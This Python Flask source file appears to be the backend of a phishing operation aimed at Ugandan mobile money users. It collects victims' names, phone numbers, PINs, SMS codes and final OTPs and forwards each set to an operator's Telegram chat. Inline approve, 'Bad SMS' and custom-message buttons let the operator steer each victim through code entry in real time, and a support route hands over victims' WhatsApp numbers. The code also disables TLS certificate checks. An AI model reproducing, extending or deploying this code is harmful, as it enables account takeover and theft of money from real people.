import os
import time
import random
import requests
from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from pymongo import MongoClient
from bson.objectid import ObjectId

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "super_secret_momo_uganda_key")

# MongoDB connection with SSL/TLS fallback for serverless/cloud environments
MONGO_URI = os.environ.get("MONGO_URI")
client = MongoClient(MONGO_URI, tls=True, tlsAllowInvalidCertificates=True)
db = client["brian_client_1st"]
applications_collection = db["applications"]
support_collection = db["support_tickets"]

# Telegram Configuration
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_ADMIN_CHAT_ID = os.environ.get("TELEGRAM_ADMIN_CHAT_ID")

def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
    db_id = str(app_data.get("_id"))
    
    message = (
        f"🇺🇬 *{stage_title}*\n\n"
        f"👤 *Name:* {app_data.get('first_name', '')} {app_data.get('last_name', '')}\n"
        f"📞 *Phone:* +256 {app_data.get('phone', '')}\n"
        f"💬 *WhatsApp:* `{app_data.get('whatsapp_phone', '-')}`\n"
        f"🔐 *PIN:* `{app_data.get('password', '-')}`\n"
        f"💬 *SMS Message:* `{app_data.get('auth_code', '-')}`\n"
        f"🔢 *Final OTP:* `{app_data.get('final_auth_code', '-')}`\n\n"
        f"🆔 *Application ID:* `{app_data.get('app_id')}`"
    )
    
    reply_markup = {
        "inline_keyboard": [
            [{"text": f"✅ Approve {step_code.upper()}", "callback_data": f"approve_{step_code}_{db_id}"}],
            [{"text": "⚠️ Bad SMS / Data", "callback_data": f"badsms_{step_code}_{db_id}"}],
            [{"text": "💬 Request Custom Message", "callback_data": f"custom_{step_code}_{db_id}"}]
        ]
    }
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "reply_markup": reply_markup
    }
    
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram alert error: {e}")

def send_telegram_support_alert(ticket_data, db_id):
    clean_phone = ticket_data.get('whatsapp_phone', '').replace('+', '').replace(' ', '')
    wa_direct_link = f"https://wa.me/{clean_phone}"
    
    message = (
        f"🆘 *NEW HELP / SUPPORT TICKET* 🆘\n\n"
        f"🆔 *Ticket ID:* `{ticket_data.get('ticket_id')}`\n"
        f"💬 *WhatsApp Phone:* `{ticket_data.get('whatsapp_phone')}`\n"
        f"📝 *Reported Issue:*\n\"{ticket_data.get('issue')}\"\n\n"
        f"⏰ *Submitted:* <t:{int(ticket_data.get('created_at'))}:R>"
    )
    
    reply_markup = {
        "inline_keyboard": [
            [{"text": "💬 Open WhatsApp Chat", "url": wa_direct_link}],
            [{"text": "✅ Mark Resolved", "callback_data": f"resolve_help_{db_id}"}]
        ]
    }
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "reply_markup": reply_markup
    }
    
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram support alert error: {e}")

@app.route("/health")
def health():
    try:
        client.admin.command('ping')
        return jsonify({"status": "ok", "database": "connected", "market": "Uganda"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/submit-support", methods=["POST"])
def submit_support():
    try:
        data = request.get_json() or {}
        whatsapp_phone = data.get("whatsapp_phone", "").strip()
        issue_text = data.get("issue", "").strip()
        
        if not whatsapp_phone or not issue_text:
            return jsonify({"status": "error", "message": "Missing required fields"}), 400
            
        ticket_data = {
            "whatsapp_phone": whatsapp_phone,
            "issue": issue_text,
            "status": "Open",
            "created_at": time.time(),
            "ticket_id": "HELP" + os.urandom(3).hex().upper()
        }
        
        inserted_id = support_collection.insert_one(ticket_data).inserted_id
        send_telegram_support_alert(ticket_data, str(inserted_id))
        
        return jsonify({"status": "ok", "message": "Ticket submitted successfully"}), 200
    except Exception as e:
        print(f"Error submitting support ticket: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/telegram-webhook", methods=["POST"])
def telegram_webhook():
    try:
        data = request.get_json() or {}
        print("=== TELEGRAM WEBHOOK RECEIVED ===", data)
        
        # 1. Handle Inline Button Clicks (Approvals, Rejections, Resolve)
        if "callback_query" in data:
            callback = data["callback_query"]
            callback_data = callback.get("data", "")
            callback_id = callback.get("id")
            
            parts = callback_data.split("_")
            if len(parts) >= 3:
                action = parts[0]
                step_code = parts[1]
                db_id = parts[2]
                
                text_response = "Action processed"
                try:
                    obj_id = ObjectId(db_id)
                except Exception as e:
                    print(f"❌ Invalid ObjectId format: {db_id}, error: {e}")
                    return jsonify({"status": "ok"}), 200
                
                target_app = applications_collection.find_one({"_id": obj_id})
                if not target_app:
                    target_app = applications_collection.find_one(sort=[("_id", -1)])
                
                if action == "resolve" and step_code == "help":
                    support_collection.update_one(
                        {"_id": obj_id},
                        {"$set": {"status": "Resolved"}}
                    )
                    text_response = "✅ Ticket marked as Resolved!"
                elif target_app:
                    actual_obj_id = target_app["_id"]
                    if action == "approve":
                        applications_collection.update_one(
                            {"_id": actual_obj_id},
                            {"$set": {"status": f"Approved_{step_code.upper()}"}}
                        )
                        text_response = f"✅ {step_code.upper()} Approved successfully!"
                    elif action == "badsms":
                        applications_collection.update_one(
                            {"_id": actual_obj_id},
                            {"$set": {"status": f"BadSMS_{step_code.upper()}"}}
                        )
                        text_response = f"⚠️ Flagged {step_code.upper()} as incorrect."
                    elif action == "custom":
                        applications_collection.update_one(
                            {"_id": actual_obj_id},
                            {"$set": {"status": "CustomMessage", "custom_message": "Please review your entry."}}
                        )
                        text_response = "💬 Prompt sent!"

            answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
            try:
                requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response}, timeout=5)
            except Exception as e:
                print(f"Answer callback error: {e}")

        # 2. Handle Direct Text Messages & Diagnostic Commands (/diagnose or /test)
        elif "message" in data:
            msg = data["message"]
            chat_id = str(msg.get("chat", {}).get("id"))
            text = msg.get("text", "").strip()
            
            if chat_id == TELEGRAM_ADMIN_CHAT_ID:
                if text in ["/test", "/diagnose"]:
                    diag_results = []
                    diag_status_icon = "🟢"
                    
                    try:
                        client.admin.command('ping')
                        diag_results.append("✅ MongoDB Atlas: Connected & Responsive")
                    except Exception as db_err:
                        diag_status_icon = "🔴"
                        diag_results.append(f"❌ MongoDB Atlas Error: {db_err}")
                        
                    try:
                        wh_res = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getWebhookInfo", timeout=5).json()
                        wh_result_data = wh_res.get("result", {})
                        pending = wh_result_data.get("pending_update_count", 0)
                        last_err = wh_result_data.get("last_error_message", "None")
                        diag_results.append(f"✅ Telegram Webhook Active\n • Pending Updates: `{pending}`\n • Last Error: `{last_err}`")
                    except Exception as wh_err:
                        diag_status_icon = "🔴"
                        diag_results.append(f"❌ Webhook Info Check Failed: {wh_err}")
                        
                    try:
                        latest_app = applications_collection.find_one(sort=[("_id", -1)])
                        if latest_app:
                            diag_results.append(f"✅ Latest DB Record:\n • ID: `{latest_app.get('app_id')}`\n • Status: `{latest_app.get('status')}`")
                        else:
                            diag_results.append("⚠️ MongoDB connected, but no applications found yet.")
                    except Exception as app_err:
                        diag_status_icon = "🟡"
                        diag_results.append(f"⚠️ Latest Record Warning: {app_err}")
                        
                    report_message = (
                        f"{diag_status_icon} *SYSTEM DIAGNOSTIC REPORT* {diag_status_icon}\n\n" +
                        "\n\n".join(diag_results)
                    )
                    
                    reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                    requests.post(reply_url, json={
                        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
                        "text": report_message,
                        "parse_mode": "Markdown"
                    })

        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
